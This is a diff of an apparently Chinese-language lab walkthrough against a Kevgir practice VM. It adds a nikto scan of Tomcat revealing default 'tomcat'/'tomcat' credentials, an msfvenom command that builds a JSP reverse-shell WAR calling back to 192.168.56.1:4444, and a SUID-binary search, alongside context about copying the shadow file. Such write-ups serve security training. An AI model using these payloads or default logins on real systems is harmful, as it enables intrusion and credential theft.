@@ -130,7 +130,62 @@ OK
 
 。。。好像没用，再尝试用ssh私钥登陆的方法，保存失败，看来是没有root权限。
 
-### 三、从8081端口攻击
+### 三、从8080端口攻击
+
+8080端口启动的是tomcat的服务，用nikto扫描一下
+
+```zsh
+promote at ~ ❯ nikto -h 192.168.56.101 -p 8080 -o kevgir.8080.html
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.101
++ Target Hostname:    192.168.56.101
++ Target Port:        8080
++ Start Time:         2020-08-20 13:03:40 (GMT8)
+---------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ /: Appears to be a default Apache Tomcat install.
++ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
++ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
++ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
++ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
++ /manager/status: Tomcat Server Status interface found (pass protected)
++ 7661 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2020-08-20 13:03:48 (GMT8) (8 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+在报告里发现有默认口令的登陆页面：
+
+| URI           | /manager/html                                                |
+| ------------- | ------------------------------------------------------------ |
+| HTTP Method   | GET                                                          |
+| Description   | Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat. |
+| Test Links    | http://192.168.56.101:8080/manager/html http://192.168.56.101:8080/manager/html |
+| OSVDB Entries | [OSVDB-0](http://osvdb.org/0)                                |
+
+登陆进去，可以部署war文件、使用msf生成、如何生成可以看我的[Generate payload with MSF](http://leiblog.wang/Generate-payload-with-MSF/)这篇文章。
+
+```zsh
+promote at ~ ❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f war > shell.war
+
+Payload size: 1097 bytes
+Final size of war file: 1097 bytes
+```
+
+
+
+### 四、从8081端口攻击
 
 ![](http://leiblog.wang/static/image/2020/8/OAxKRs.png)
 
@@ -342,6 +397,8 @@ drwxr-xr-x  2 root root    4096 Feb  3  2016 .
 drwxr-xr-x 22 root root    4096 Feb 13  2016 ..
 -rwxr-xr-x  1 root root  986672 Oct  7  2014 bash
 ```
+
+`find / -perm -u=s 2>/dev/null`来搜索能够使用的sudo命令。
 
 在bin下面使用cp命令，拷贝shadow文件
 
